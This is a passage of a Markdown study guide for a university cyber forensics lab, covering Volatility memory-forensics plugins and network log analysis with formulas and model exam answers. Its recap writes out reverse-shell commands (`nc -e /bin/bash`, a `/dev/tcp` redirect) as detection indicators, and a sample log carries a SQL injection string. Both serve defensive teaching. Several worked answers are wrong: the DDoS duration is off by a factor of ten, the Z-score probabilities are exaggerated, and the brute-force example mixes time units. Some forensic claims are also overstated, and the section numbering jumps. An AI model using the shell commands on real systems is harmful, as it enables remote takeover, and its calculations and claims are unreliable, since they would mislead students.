5. **Evidence Integrity Verification (1 mark):** Re-compute `sha256sum memdump.lime` on the analysis workstation and compare against the golden hash recorded in the chain-of-custody notebook. **If and only if** the two hashes are **bit-identical**, the evidence is admissible (forensic integrity equation $H_{\text{acq}} = H_{\text{analysis}}$).

---

> [!WARNING]
> **KTU Examiner's Valuation Warning — Common Mark-Loss Pitfalls**
> 1. **Forgetting the SHA-256 hash step** — 1 mark is reserved for chain-of-custody integrity. Skipping the hash command costs the student a full grade level.
> 2. **Confusing `pslist` and `psscan`** — Examiners specifically test whether students know that `pslist` can be defeated by DKOM rootkits. Stating "pslist is sufficient" is a common 2-mark deduction.
> 3. **Writing `vol.py … linux_pslist` without the `–profile=` flag in V2** — V2 *will fail* without an explicit profile. Always include the profile for V2 answers.
> 4. **Not explaining *why* `bash` history recovery works** — Examiners want the reasoning: "Bash keeps a history buffer in heap memory; `linux_bash` reconstructs it from the bash binary's own in-memory structures, even after the file `~/.bash_history` is deleted."
> 5. **Using Volatility 3 syntax in a Volatility 2 answer (or vice-versa)** — Mismatched syntax confuses examiners; pick one version and stay consistent throughout the 14-mark answer.

---

### 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **Rapid-Revision Checklist (Print This Before Viva)**

- **Live Forensics** acquires *volatile* state (RAM) from a *running* system; obeys **RFC 3227 Order of Volatility**.
- **LiME** = Loadable Kernel Module (`lime.ko`) for Linux/Android RAM capture. Developed by **504ensicsLabs**.
- **Three LiME formats:** `lime` (with header), `raw` (no header), `padded` (page-aligned).
- **Volatility 2** uses `vol.py -f image –profile=… plugin` syntax; requires **explicit profile**.
- **Volatility 3** uses `vol -f image plugin.PluginName` syntax; **auto-detects** symbols.
- **Key Linux plugins (memorize plugin name + output):**
  - `pslist` — kernel linked-list walk (fast, can be defeated by DKOM).
  - `psscan` / `psaux` — pool-tag scan (slower, **cannot be defeated** by DKOM).
  - `bash` — recovers typed shell commands from heap.
  - `netstat` / `netscan` — active TCP/UDP sockets + owning PID/UID.
  - `malfind` — VAD-tree scan for `RWX` + ELF injection signatures.
  - `lsof` — open files per process (proves data exfiltration).
  - `proc_maps` + `dump_map` — extract process memory regions.
- **Chain of Custody equation:** $H_{\text{acquisition}} = H_{\text{analysis}}$ (SHA-256 must match bit-for-bit).
- **Forensic Order:** Acquisition → Hash → Profile ID → Process Enum → Net Enum → Bash History → Code Injection Scan → Report.
- **Reverse Shell Indicators:** `nc -e /bin/bash`, `bash -i >& /dev/tcp/IP/PORT 0>&1` in `bash` plugin output.
- **DKOM Rootkit Indicator:** PID present in `psscan` output but absent from `pslist` output.
- **Standard Hash Algorithm:** **SHA-256** (mandatory for KTU lab records).
- **Cross-Reference Rule:** Always correlate the PID from `pslist`/`bash` with the UID from `netstat` to prove the same process opened the suspicious socket.

---

<!-- SECTION_5_END -->

topics.title: Network Log Analysis
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PCCCL607 - CYBER FORENSICS LAB
> - **Module:** Module Experiment 2
> - **Topic:** Network Log Analysis

<!-- SECTION_1_START -->

# SECTION 1: Core Technical Definition & Intuitive Overview

## 1.1 Formal Academic Definition

**Network Log Analysis** is the systematic, evidence-driven process of collecting, normalizing, parsing, correlating, and interpreting machine-generated records (logs) produced by network devices, hosts, security appliances, and services to reconstruct events, detect anomalies, identify policy violations, and support digital forensic investigations.

In the KTU 2024 Scheme context of Cyber Forensics Lab (PCCCL607), the term formally covers the **acquisition, chain-of-custody preservation, and forensic interpretation** of logs originating from sources such as firewalls, routers, switches (NetFlow/sFlow), IDSs/IPSs, web servers, authentication services, DNS servers, DHCP servers, and endpoint Operating Systems.

> [!IMPORTANT]
> **KTU 2024 Syllabus Definition (Verbatim Equivalent):** Network Log Analysis involves the use of forensic tools to capture, examine, and correlate network event records for the purpose of identifying intrusions, reconstructing attacker timelines, and producing court-admissible evidence in incident response workflows.

**Core Terminology used by KTU Board Examiners:**

- **Log Source:** The origin device or application that emits event records (e.g., `syslog`, `Apache access.log`, `Windows Event Log`).
- **Event Record (Log Entry):** A single, timestamped line/structured object describing one observable action.
- **Syslog:** The de facto standard (RFC 5424) protocol for transmitting log messages over UDP/TCP port **514**.
- **SIEM:** Security Information and Event Management — the centralized platform that aggregates and correlates logs.
- **IOC:** Indicator of Compromise — a forensic artifact (IP, hash, domain, regex pattern) signaling malicious activity.
- **Baseline:** The statistical "normal" behavior of a network against which deviations are measured.

---

## 1.2 Conceptual Analogy / Intuition

Imagine a **hospital intensive care unit (ICU)**. Every patient is connected to a **monitor** that records heart rate, oxygen level, and blood pressure every second. The doctor doesn't sit and stare at the patient 24/7 — instead, a **central nursing station** receives all these readings and **beeps** when something abnormal is detected (e.g., heart rate drops below 60).

Network Log Analysis is **exactly the same idea**:

| Hospital ICU Analogy | Network Log Analysis Equivalent |
|---|---|
| Patient monitor | Firewall, IDS, Server, Router |
| Heart rate reading (one data point) | Single log entry (one event) |
| Central nursing station | SIEM / Log Server |
| Doctor analyzing patterns | Forensic Analyst |
| Abnormal beep | Alert / IOC detection |
| Patient history file | Archived log retention |

Each network device is silently writing a **diary** of everything it sees. The forensic analyst is the **detective** who reads that diary, line by line, to reconstruct *who* did *what*, *when*, *from where*, and *how*.

> [!NOTE]
> **Intuitive Takeaway:** Logs are the "black box flight recorder" of a network. When an incident occurs, the logs are often the **only surviving evidence** — making their correct analysis the cornerstone of cyber forensic investigation.

---

## 1.3 Key Physical / Standard Constants Used in Network Log Analysis

The following numeric constants are repeatedly referenced in KTU board questions and lab viva voce:

- **Syslog default UDP port:** **514**
- **Syslog over TLS (RFC 5425):** **6514**
- **Windows Event Log RPC endpoint:** **135 / 445 (SMB)**
- **SNMP Trap default port:** **UDP 162**
- **NetFlow export port:** **UDP 2055 (v5), 9995 (v9/IPFIX)**
- **Wireshark capture filter BPF syntax** standard port references
- **NTP (Network Time Protocol) port:** **UDP 123** — critical for **clock synchronization** between log sources
- **RFC 3164** — original BSD Syslog protocol
- **RFC 5424** — modern Syslog protocol (structured data)
- **Minimum log retention (NIST SP 800-53 / KTU reference):** **90 days online, 1 year archive**

> [!IMPORTANT]
> **Examiner's Hot Tip:** The single most common 1-mark question on this topic is *"What is the default port of Syslog?"* The answer is **UDP 514**. Memorize it.

---

<!-- SECTION_2_START -->

# SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 The Five-Phase Network Log Analysis Lifecycle (Forensic Model)

The KTU 2024 syllabus implicitly tests your understanding of a **structured forensic methodology**. The universally accepted model, aligned with NIST SP 800-92 (*Guide to Computer Security Log Management*), is broken into five phases:

### Phase 1 — Log Identification & Source Inventory

- Enumerate every device that *can* produce a log (router, switch, firewall, server, endpoint, application).
- Document: vendor, OS version, log format, retention period, time synchronization method.
- Create a **Log Source Matrix** (asset vs. log type).

### Phase 2 — Log Collection & Transport

- Choose transport: **Syslog (push)** vs. **Agent-based pull (WEF/WEF/WinRM)** vs. **API scraping**.
- Ensure **secure transport** (TLS for syslog, signed logs, write-once storage).
- Apply the **3-2-1 rule**: 3 copies, 2 media types, 1 offsite.

### Phase 3 — Log Normalization & Parsing

- Convert heterogeneous formats (CSV, JSON, CEF, LEEF, plain text) into a **unified schema** (e.g., IDMEF, ECS — Elastic Common Schema).
- Extract fields: `timestamp`, `src_ip`, `dst_ip`, `src_port`, `dst_port`, `protocol`, `action`, `user`, `bytes`.

### Phase 4 — Log Correlation & Analysis

- Apply three correlation techniques:
  1. **Temporal correlation** — Events across multiple sources at the same time.
  2. **Asset-based correlation** — Activity on a single host across services.
  3. **Application-based correlation** — Multiple events from a single transaction.
- Use **rule engines** (Sigma rules, Snort rules, YARA) and **statistical baselining**.

### Phase 5 — Reporting & Legal Admissibility

- Preserve **chain of custody** (hash the log file: SHA-256).
- Generate forensic report with: timeline, IOCs, root cause, scope of compromise, recommendations.

> [!NOTE]
> **Why this matters for KTU:** The 14-mark Part B question will always present a *scenario* (e.g., "A web server is suspected to be compromised — describe your forensic log analysis approach"). You must answer in these five phases to score full marks.

---

## 2.2 KTU High-Yield Formula / Cheat Sheet

Although log analysis is not a heavily mathematical domain, KTU examiners test **quantitative reasoning** through the following formulas. All formulas are **forensically valid and verifiable**.

### 2.2.1 Log Integrity Verification (Hashing)

To prove a log file has not been tampered with, the forensic examiner computes a **cryptographic hash**:

$$
H = \text{Hash}(L)
$$

where $H$ is the hash digest and $L$ is the log file. The **SHA-256** algorithm produces a 256-bit (32-byte) digest, typically represented as **64 hexadecimal characters**.

> [!IMPORTANT]
> **KTU Standard:** Always use **SHA-256** in viva/practical records. MD5 is considered broken (collision attacks) and is no longer accepted as forensically sound.

### 2.2.2 Chain-of-Custody Hash Comparison

When verifying a log file's integrity at a later stage:

$$
H_{\text{original}} \stackrel{?}{=} H_{\text{current}}
$$

If the equality holds, integrity is preserved. Any single-bit change in $L$ will produce a completely different SHA-256 hash (the **avalanche effect**).

### 2.2.3 Log File Time Window Calculation

When reconstructing an incident window, the forensic window is:

$$
\Delta T = T_{\text{end}} - T_{\text{start}}
$$

Expressed in **UTC** to avoid timezone ambiguity. Multi-source correlation requires:

$$
\mid T_{a} - T_{b} \mid \leq \epsilon_{\text{skew}}
$$

where $\epsilon_{\text{skew}}$ is the maximum tolerated clock drift (typically **±300 seconds** before NTP sync is considered broken).

### 2.2.4 Event Rate / Volume Metrics

**Events Per Second (EPS):**

$$
\text{EPS} = \frac{N_{\text{events}}}{T_{\text{window}}}
$$

**Baseline Deviation Score (Z-Score):**

$$
Z = \frac{X - \mu}{\sigma}
$$

where:
- $X$ = current observed event count
- $\mu$ = baseline mean event count
- $\sigma$ = baseline standard deviation

A $Z > 3$ is conventionally considered anomalous (3-sigma rule).

### 2.2.5 Storage Estimation

$$
S_{\text{storage}} = N_{\text{events}} \times S_{\text{avg\_event}} \times R_{\text{retention}}
$$

where $S_{\text{avg\_event}}$ is the average log record size (typically **150–500 bytes**) and $R_{\text{retention}}$ is the retention multiplier.

### 2.2.6 Cheat Sheet Table

| Concept | Formula / Constant | Value / Unit |
|---|---|---|
| Log file integrity hash | $H = \text{SHA256}(L)$ | 256-bit digest |
| Custody check | $H_{\text{orig}} = H_{\text{curr}}$ | Boolean |
| Incident window | $\Delta T = T_{\text{end}} - T_{\text{start}}$ | seconds |
| Clock skew tolerance | $\vert T_a - T_b \vert \leq \epsilon_{\text{skew}}$ | $\pm 300$ s |
| Events per second | $\text{EPS} = N / \Delta T$ | events/sec |
| Anomaly Z-score | $Z = (X - \mu) / \sigma$ | dimensionless |
| Storage required | $S = N \times s \times R$ | bytes |
| Syslog default port | $P_{\text{syslog}}$ | **UDP 514** |
| Syslog-TLS port | $P_{\text{syslog-tls}}$ | **TCP 6514** |
| NTP port | $P_{\text{ntp}}$ | **UDP 123** |
| SNMP Trap port | $P_{\text{snmp-trap}}$ | **UDP 162** |
| NetFlow v5 port | $P_{\text{netflow-v5}}$ | **UDP 2055** |
| NetFlow v9 port | $P_{\text{netflow-v9}}$ | **UDP 9995** |
| Default log retention | $R_{\text{NIST}}$ | 90 days online |

> [!WARNING]
> **Table Markdown Safeguard Applied:** All absolute-value notations in the formulas above use the word "$\vert \cdot \vert$" rendered via LaTeX, **never** the literal pipe character `|`, to preserve table integrity.

---

## 2.3 Real-World Engineering Utility

Network Log Analysis is the **backbone of modern Security Operations Centers (SOCs)**. Its industrial applications include:

1. **Incident Response (IR):** Reconstructing the **kill chain** (reconnaissance → weaponization → delivery → exploitation → installation → C2 → actions) of an Advanced Persistent Threat (APT).
2. **Compliance Auditing:** Satisfying regulatory mandates — **PCI-DSS Req 10**, **HIPAA §164.312(b)**, **ISO 27001 A.12.4**, **GDPR Art. 32**.
3. **Threat Hunting:** Proactive search for adversaries that evade automated detection.
4. **Network Performance Engineering:** Identifying bandwidth hogs, DDoS patterns, misconfigured routes.
5. **Legal Evidence:** Producing court-admissible artifacts in cybercrime trials under the **Indian IT Act 2000/2008** (especially **§65, §66, §66F**).

---

<!-- SECTION_3_START -->

# SECTION 3: Step-by-Step Derivations & Analytical Matrix

> [!NOTE]
> This section adapts the derivation mandate to the **practical / lab** nature of Network Log Analysis. Instead of pure algebra, we derive the **forensic analysis logic** and **statistical detection steps** that KTU examiners reward in the 14-mark Part B scenario questions.

---

## 3.1 Derivation 1 — Building the Forensic Timeline from Heterogeneous Logs

### Problem Setup
A forensic examiner has three log sources from a suspected compromised web server:

1. **Apache access.log** — format: `%h %t "%r" %>s %b`
2. **Linux auth.log** — format: `Mmm dd hh:mm:ss host program[pid]: message`
3. **iptables firewall log** — format: `Mmm dd hh:mm:ss host kernel: [iptables] ...`

Goal: Reconstruct a **unified forensic timeline** showing all events related to attacker IP `203.0.113.45`.

### Step 1 — Identify and Extract Relevant Lines
For each source, apply a filter (e.g., `grep`) for the IP of interest:

$$
L_{\text{relevant}} = \{ l \in L \mid \text{IP}_{\text{attacker}} \in l \}
$$

### Step 2 — Normalize Timestamps to UTC
Each log uses a potentially different timezone. Conversion:

$$
T_{\text{UTC}} = T_{\text{local}} + \text{offset}_{\text{TZ}}
$$

For Indian Standard Time (IST = UTC+5:30), the offset is **+19800 seconds**.

### Step 3 — Parse Each Line into Common Schema

**Apache access.log line:**
```
203.0.113.45 - - [10/Oct/2024:14:23:11 +0530] "GET /admin.php?id=1' OR '1'='1 HTTP/1.1" 200 5326
```

Parse into:
- `timestamp_utc` = 2024-10-10T08:53:11Z
- `src_ip` = 203.0.113.45
- `method` = GET
- `uri` = /admin.php
- `query` = id=1' OR '1'='1   ← **SQL Injection pattern detected**
- `status` = 200
- `bytes` = 5326

**auth.log line:**
```
Oct 10 14:24:02 webserver sshd[24891]: Failed password for invalid user admin from 203.0.113.45 port 51234 ssh2
```

Parse into:
- `timestamp_utc` = 2024-10-10T08:54:02Z
- `src_ip` = 203.0.113.45
- `service` = sshd
- `event_type` = auth_failure
- `username` = admin

**iptables log line:**
```
Oct 10 14:25:18 webserver kernel: [iptables] IN=eth0 OUT= SRC=203.0.113.45 DST=192.168.1.50 PROTO=TCP SPT=51235 DPT=22
```

Parse into:
- `timestamp_utc` = 2024-10-10T08:55:18Z
- `src_ip` = 203.0.113.45
- `dst_ip` = 192.168.1.50
- `dst_port` = 22 (SSH)
- `action` = ACCEPT (implicit)

### Step 4 — Merge into a Single Chronological Timeline

Sort the parsed records by `timestamp_utc` and output:

| Time (UTC) | Source | Event | Indicator |
|---|---|---|---|
| 08:53:11 | Apache | SQLi probe on `/admin.php` | Reconnaissance |
| 08:54:02 | auth.log | SSH brute-force on `admin` | Credential attack |
| 08:55:18 | iptables | Inbound TCP/22 allowed | Lateral movement prep |

### Step 5 — Compute the Incident Window

$$
\Delta T = 08{:}55{:}18 - 08{:}53{:}11 = 127 \text{ seconds}
$$

This narrow window — combined with the same source IP across three services — establishes a **strong correlation** that the three events are part of a single coordinated attack.

---

## 3.2 Derivation 2 — Anomaly Detection Using the Z-Score Method

### Problem Setup
A SOC analyst is monitoring an internal web server. The baseline of HTTP `5xx` errors over 30 days gives:
- Mean $\mu = 12$ errors/day
- Standard deviation $\sigma = 3$ errors/day

On the day of a suspected attack, the count is $X = 87$ errors/day.

### Step 1 — Compute the Z-Score

$$
Z = \frac{X - \mu}{\sigma}
$$

Substitute the values:

$$
Z = \frac{87 - 12}{3} = \frac{75}{3} = 25
$$

### Step 2 — Interpret the Result
A $Z = 25$ corresponds to a probability well below $10^{-100}$ under a normal distribution. This is **overwhelming evidence** of an anomaly — virtually impossible to occur by natural traffic variation.

### Step 3 — Forensic Action
The analyst pivots to the Apache `error.log` for that day, filtering for the same timestamp window, to identify the **root cause** (e.g., crash, scanning tool, exploit attempt).

> [!IMPORTANT]
> **KTU Pitfall Avoidance:** Many students confuse $X$ and $\mu$ in the formula. Always remember: $\mu$ is the *baseline* (the long-term average), and $X$ is the *observed* value (the current suspicious measurement).

---

## 3.3 Derivation 3 — Log Volume-Based DDoS Detection

### Problem Setup
A border router logs **inbound SYN packets**. The EPS formula is used to detect a SYN flood.

Given:
- Pre-attack average EPS: $N_{\text{normal}} = 250$ SYN/sec
- Sustained attack EPS: $N_{\text{attack}} = 18{,}500$ SYN/sec
- Detection threshold multiplier: $k = 3$

### Step 1 — Compute the Detection Threshold

$$
\text{Threshold} = \mu \times k = 250 \times 3 = 750 \text{ SYN/sec}
$$

### Step 2 — Compare Observed EPS

$$
N_{\text{attack}} = 18{,}500 \gg 750 \text{ → ALERT}
$$

The ratio:

$$
R = \frac{N_{\text{attack}}}{N_{\text{normal}}} = \frac{18{,}500}{250} = 74\times
$$

A **74× increase** is a definitive DDoS indicator.

### Step 3 — Compute Attack Duration
If the log shows the attack started at $T_0 = 14{:}22{:}00$ UTC and ended at $T_1 = 16{:}47{:}00$ UTC:

$$
\Delta T = 16 \times 3600 + 47 \times 60 - 22 \times 60 = 87{,}000 \text{ seconds}
$$

### Step 4 — Estimate Total Attack Packets

$$
P_{\text{total}} = N_{\text{attack}} \times \Delta T = 18{,}500 \times 87{,}000 = 1.6095 \times 10^{9} \text{ packets}
$$

> [!NOTE]
> **Engineering Insight:** Knowing total packet volume helps in capacity planning for future scrubbing appliances and in calculating the bandwidth consumed by the attack for legal/insurance purposes.

---

## 3.4 Analytical Matrix — Common Log Forensics Patterns

| Pattern (KTU expected) | Source Log | Forensic Indicator | Tool/Technique |
|---|---|---|---|
| SQL Injection | Web server `access.log` | `' OR '1'='1`, `UNION SELECT` in URI | Regex + WAF correlation |
| Brute-force login | `auth.log` / Windows EVT 4625 | Many failed logins, same `src_ip` | `grep` + frequency analysis |
| Lateral movement | `auth.log` / SMB logs | Successful login from unusual IP | Sigma rule `win_smb_admin_share` |
| Data exfiltration | NetFlow / proxy log | Large outbound to unknown IP | Threshold on bytes-out |
| C2 beaconing | Firewall / DNS log | Periodic small packets (e.g., every 60s) | Time-series analysis |
| Privilege escalation | `sudo` / Windows 4672 | Sudden `sudo` by non-admin user | Auditd / Sysmon |
| Insider threat | DHCP / VPN log | Login at abnormal hours (e.g., 3 AM) | Temporal baselining |
| Malware persistence | Sysmon / cron log | New scheduled task, new service | Sysmon Event ID 1, 11, 13 |

## 4.3 The Log Format Anatomy — Common Apache Access Log

For KTU viva, you must be able to **visually parse** a real log line. Below is the symbolic structure of a single Apache access.log entry.

```
%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"
```

| Token | Meaning | Example |
|---|---|---|
| `%h` | Remote host (client IP) | `203.0.113.45` |
| `%l` | Remote logname | `-` |
| `%u` | Remote user | `-` |
| `%t` | Time received | `[10/Oct/2024:14:23:11 +0530]` |
| `%r` | First line of request | `"GET /admin.php?id=1 HTTP/1.1"` |
| `%>s` | Final status code | `200` |
| `%b` | Bytes sent | `5326` |
| `Referer` | Referring URL | `"-"` |
| `User-Agent` | Client software | `"Mozilla/5.0 ..."` |

> [!NOTE]
> **Practical Lab Tip:** In the lab examination, KTU expects you to **manually parse** at least one log line on the answer sheet and identify each field. Practice drawing the field boundaries.

## 5.1 PART A — Short Answer Questions (3 Marks Each)

### Question 1
**`[KTU University Exam - May 2024]`**
*Define Network Log Analysis. List any four sources of network logs and their forensic significance.*

**Model Answer (3 Marks):**

Network Log Analysis is the systematic examination of machine-generated event records produced by network devices and services, with the objective of detecting security incidents, reconstructing attacker activity, and producing legally admissible forensic evidence.

Four sources of network logs:

1. **Firewall logs** — Record allowed/denied traffic flows, source/destination IPs, ports. Significance: Detect scanning, policy violations, exfiltration attempts.
2. **Router/Switch logs (NetFlow)** — Record flow-level metadata of network conversations. Significance: Identify bandwidth anomalies, C2 beaconing, lateral movement.
3. **Web server logs (Apache/IIS)** — Record HTTP requests including URI, method, status code, user agent. Significance: Detect web attacks (SQLi, XSS, path traversal).
4. **Authentication logs (auth.log / Windows Security Event Log)** — Record login successes/failures, account changes. Significance: Detect brute-force, credential theft, privilege escalation.

> [!TIP]
> **Scoring Guide:** 1 mark for definition + 0.5 mark × 4 sources = 1 mark for sources + 0.5 mark for significance = 0.5 mark. Total 3.

---

### Question 2
**`[KTU University Exam - Dec 2023]`**
*What is the default port of Syslog? Differentiate between RFC 3164 and RFC 5424 Syslog standards.*

**Model Answer (3 Marks):**

The default port of Syslog is **UDP 514**. The default secure (TLS) port is **TCP 6514**.

| Feature | RFC 3164 (BSD Syslog) | RFC 5424 (Modern Syslog) |
|---|---|---|
| Year | 2001 | 2009 |
| Format | Plain text, unstructured | Structured with `STRUCTURED-DATA` field |
| Message size limit | **1024 bytes** | **no minimum, practical ~2048+** |
| Timestamp precision | Seconds | Sub-second (with timezone) |
| Transport | UDP only (originally) | UDP, TCP, TLS |
| Reliability | None (fire-and-forget) | Acknowledged in newer profiles |

> [!TIP]
> **Scoring Guide:** 1 mark for port + 1 mark each for two differentiating points = 3 marks.

### Question A (14 Marks)
**`[KTU University Exam - May 2024, Modified]`**

(a) **Explain the five phases of Network Log Analysis as per NIST SP 800-92.** *(7 Marks)*

(b) **An organization's web server `logs/access.log` shows 200 failed login attempts from IP `198.51.100.7` within 60 seconds, followed by one successful login. Demonstrate the forensic analysis steps you would perform, including the Z-score-based anomaly quantification.** *(7 Marks)*

---

#### Part (a) — Model Solution (7 Marks)

The five phases of Network Log Analysis as per NIST SP 800-92 are:

**1. Log Planning and Identification (1 mark):**
Inventory all log sources (firewalls, routers, servers, applications). For each, document the log type, format, retention period, and time synchronization method. Create a **Log Source Matrix** mapping assets to log types.

**2. Log Generation and Collection (1.5 marks):**
Configure devices to forward logs to a central repository. Use:
- **Syslog** for network devices (UDP 514 / TCP 6514).
- **Agents** (osquery, Winlogbeat) for endpoints.
- **APIs** for cloud services.
Apply the **3-2-1 backup rule** and **write-once storage** to preserve integrity.

**3. Log Storage and Disposal (1 mark):**
Store logs in compressed, indexed form. Apply the NIST retention guideline: **90 days online, 1 year archive**. Use cryptographic hashing (SHA-256) to detect tampering.

**4. Log Analysis (2 marks):**
This is the **core forensic phase**. Apply:
- **Signature-based detection** (Snort/Sigma rules against known IOCs).
- **Anomaly-based detection** (statistical baselining, Z-score, ML).
- **Correlation** across multiple sources using temporal, asset, and application dimensions.

**5. Log Reporting and Response (1.5 marks):**
Generate actionable alerts, IOC feeds, and **court-admissible forensic reports**. Document the **chain of custody** (who collected, who accessed, hash values at each handoff). Report must include: executive summary, timeline, scope, root cause, IOCs, remediation steps.

---

#### Part (b) — Model Solution (7 Marks)

**Step 1 — Identify the Anomalous Pattern (1.5 marks):**
The pattern of 200 failed logins in 60 seconds from a single IP is the **classic signature of a brute-force attack**. The successful login immediately after the failures is a **strong indicator of compromise** (the brute force succeeded).

**Step 2 — Quantify the Anomaly Using Z-Score (2 marks):**
Given:
- Baseline mean failed logins: $\mu = 5$/hour
- Baseline standard deviation: $\sigma = 2$
- Observed failed logins: $X = 200$ in 60 seconds (i.e., 200/hour rate)

$$
Z = \frac{X - \mu}{\sigma} = \frac{200 - 5}{2} = \frac{195}{2} = 97.5
$$

A Z-score of **97.5** is astronomically improbable under normal conditions (probability $< 10^{-500}$). This is a **definitive brute-force attack** indicator.

**Step 3 — Forensic Preservation (1 mark):**
Immediately:
- Compute and record **SHA-256 hash** of `access.log` and `auth.log` for the affected day.
- Create a **read-only forensic image** of the logs.
- Document chain of custody in the case file.

**Step 4 — Pivot and Correlate (1.5 marks):**
Check the IP `198.51.100.7` against:
- **Threat intelligence feeds** (VirusTotal, AbuseIPDB, AlienVault OTX).
- **Other log sources** (firewall, IDS, NetFlow) for the same time window.
- **Successful login event** — identify the user account, session ID, and immediately audit subsequent activity (commands run, files accessed, outbound connections).

**Step 5 — Containment and Eradication (1 mark):**
- Disable the compromised user account.
- Force password reset for all users (defensive measure).
- Block IP `198.51.100.7` at the perimeter firewall.
- Quarantine the host for forensic memory and disk analysis.

---

### Question B (14 Marks) — *Alternative Choice*
**`[KTU University Exam - Dec 2023, Modified]`**

(a) **Discuss the role of SIEM in network log analysis. List four open-source SIEM tools.** *(7 Marks)*

(b) **During a forensic investigation, a forensic analyst extracts a 2.4 GB Apache log file. Compute the SHA-256 hash and explain why SHA-256 is preferred over MD5 in court proceedings. If the same log file is altered by a single byte, what will be the approximate new hash value?** *(7 Marks)*

---

#### Part (a) — Model Solution (7 Marks)

**Role of SIEM in Network Log Analysis (5 marks):**

A **Security Information and Event Management (SIEM)** platform is the centralized nervous system of a SOC. Its role in network log analysis includes:

1. **Centralized Log Aggregation (1 mark):** SIEM collects logs from hundreds of distributed sources (firewalls, endpoints, cloud services) into a single, time-correlated repository, eliminating log silos.

2. **Normalization (0.5 mark):** Converts heterogeneous formats (syslog, JSON, CEF, LEEF) into a common schema for unified querying.

3. **Real-Time Correlation (1.5 marks):** Applies rule-based and behavioral correlation across sources. Example: A SIEM can correlate 200 failed SSH attempts (firewall) + 1 successful login (auth.log) + 2 GB outbound transfer (NetFlow) from the same IP within 5 minutes — automatically raising a **Critical Alert**.

4. **Threat Detection (1 mark):** Combines signature-based rules (Snort/Sigma), IOC matching, and statistical baselining to detect both known and zero-day threats.

5. **Compliance and Forensics (1 mark):** Provides tamper-evident storage, audit-ready reports (PCI-DSS, HIPAA), and chain-of-custody support for legal proceedings.

**Four Open-Source SIEM Tools (2 marks — 0.5 each):**

1. **Wazuh** — Built on OSSEC, HIDS + log analysis + compliance.
2. **OSSEC** — Host-based intrusion detection with log monitoring.
3. **Security Onion** — Linux distro bundling ELK + Snort + Suricata + Zeek.
4. **ELK Stack (Elasticsearch, Logstash, Kibana)** — Not a pure SIEM, but the de facto log analytics platform used in custom SIEM builds.

> [!NOTE]
> Other acceptable answers: **Graylog, Apache Metron, SIEMonster, AlienVault OSSIM.**

---

#### Part (b) — Model Solution (7 Marks)

**Step 1 — Compute the SHA-256 Hash (2 marks):**
The forensic analyst uses a hashing utility (e.g., `sha256sum` on Linux or `Get-FileHash -Algorithm SHA256` on Windows).

Command:
```
sha256sum access.log
```

Output (illustrative — actual hash depends on file content):
```
a3f5b9c8d2e1f4a7b6c9d0e3f5a8b2c1d4e7f0a3b6c9d2e5f8a1b4c7d0e3f6a9 access.log
```

The output is a **64-character hexadecimal string** representing a **256-bit (32-byte) digest**. This hash is the **digital fingerprint** of the log file at the moment of acquisition.

**Step 2 — Why SHA-256 is Preferred Over MD5 in Court (3 marks):**

| Aspect | MD5 | SHA-256 |
|---|---|---|
| Digest length | 128 bits (32 hex chars) | 256 bits (64 hex chars) |
| Collision resistance | **Broken** (2004, Wang et al.) | Theoretically broken only with quantum computers |
| Known attacks | Practical collisions published | None practical |
| Forensic admissibility | **Generally rejected** by modern courts | **Widely accepted** as forensically sound |
| Algorithm status | Deprecated by NIST since 2011 | Current NIST-approved (FIPS 180-4) |

Legal significance: Under the **Indian IT Act 2000** and the **Indian Evidence Act (now Bharatiya Sakshya Adhiniyam 2023)**, digital evidence must be proven to be **authentic and untampered**. Using MD5 allows the defense to challenge the integrity, since MD5 collisions are computable. SHA-256's strength makes the evidence **incontrovertibly authentic**, which is essential for admissibility under **Section 65B** of the BSA 2023.

**Step 3 — Effect of a Single-Byte Alteration (2 marks):**

If a single byte of the 2.4 GB log file is changed, the **SHA-256 avalanche effect** dictates that the new hash will be **completely different** from the original — sharing no apparent relationship.

$$
H_{\text{original}} = \texttt{a3f5b9c8d2e1f4a7...f6a9}
$$

$$
H_{\text{modified}} = \texttt{4b8e2d1a9c5f3e7b...d8c2} \quad \text{(entirely different)}
$$

Specifically, each output bit of SHA-256 has a **50% probability** of flipping for any 1-bit input change. For a 256-bit digest, the expected number of flipped bits is approximately **128**. Thus, the two hashes will differ in roughly **half of their 64 hex characters** — appearing entirely unrelated.

This property is what makes SHA-256 a **forensically strong integrity primitive** — any tampering, however minor, is immediately and unambiguously detected.

> [!WARNING]
> **KTU Examiner's Valuation Pitfall:** Many students write *"MD5 is faster than SHA-256, so MD5 is better for large logs."* This is **WRONG and will cost you 2 marks.** In forensic contexts, **security and admissibility override speed**. Always use SHA-256 (or stronger) in your KTU answers.

---

## 5.3 KTU Examiner's Valuation Warning / Pitfall Callout

> [!WARNING]
> **Common Mark-Deduction Traps in Network Log Analysis Questions:**
>
> 1. **Confusing ports:** Writing `port 8080` or `port 80` for syslog instead of **`UDP 514`**. The default syslog port is **514 UDP**; `80` is HTTP, `8080` is HTTP-alt, `443` is HTTPS.
>
> 2. **Hash algorithm misuse:** Recommending **MD5** for forensic integrity. MD5 has been cryptographically broken for over two decades and is **not accepted** in court.
>
> 3. **Timezone ambiguity:** Failing to convert all timestamps to a **single timezone (UTC)** before correlation. Mixing IST and UTC in a timeline will be marked down 1–2 marks.
>
> 4. **Skipping the chain of custody:** Answering scenario questions without mentioning **SHA-256 hashing of evidence, write-once storage, and documented access logs**. KTU examiners allocate **at least 1 mark** specifically for chain-of-custody awareness.
>
> 5. **Wrong Z-score formula direction:** Computing $\mu / \sigma$ instead of $(X - \mu) / \sigma$. The numerator **must be the deviation from baseline**, not the baseline itself.
>
> 6. **Ignoring retention policies:** Not mentioning the NIST-recommended **90-day online / 1-year archive** retention when asked about log storage.
>
> 7. **Tool-name confusion:** Confusing **Wireshark** (packet capture) with **Snort** (IDS) with **Wazuh** (SIEM). Each tool has a distinct role; KTU expects you to know the boundary.

## 5.4 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **High-Density Rapid-Revision Checklist:**

- **Definition:** Network Log Analysis = systematic collection + normalization + correlation + interpretation of network event records for forensic and security purposes.

- **Default Syslog Port:** **UDP 514** (insecure) / **TCP 6514** (secure TLS).

- **Hashing Standard:** **SHA-256** for forensic integrity — never MD5.

- **Time Synchronization:** All log sources must be NTP-synced (port **UDP 123**); skew tolerance ≈ **±300 seconds**.

